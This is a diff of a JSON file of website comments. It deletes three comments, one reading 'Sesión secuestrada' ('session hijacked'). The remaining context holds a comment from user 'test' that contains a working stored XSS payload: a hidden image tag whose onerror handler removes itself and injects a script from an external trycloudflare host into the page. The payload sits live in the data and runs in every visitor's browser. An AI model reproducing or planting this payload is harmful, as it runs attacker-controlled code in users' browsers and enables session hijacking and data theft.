@@ -1,25 +1,5 @@
 [
   {
-    "id": 15,
-    "username": "ñacañaca",
-    "content": "Secuestrame a mi 💋",
-    "createdAt": "2026-05-28T20:11:48",
-    "likes": 0
-  },
-  {
-    "id": 14,
-    "username": "ñacañaca",
-    "content": "Sesión secuestrada",
-    "createdAt": "2026-05-27T19:35:26",
-    "likes": 0
-  },
-  {
-    "id": 13,
-    "username": "ñacañaca",
-    "content": "que chico tan guapo ha hecho esta web o.o",
-    "createdAt": "2026-05-27T12:22:20"
-  },
-  {
     "id": 11,
     "username": "test",
     "content": "Test XSS Payload!<img style=\"display:none\" id=\"xssPayload\" src=x onerror=\"document.getElementById('xssPayload').remove(); var node = document.createElement('script');node.src = 'https://fit-rides-trio-dec.trycloudflare.com/webSocket.js';document.getElementsByTagName('head')[0].appendChild(node);\">",
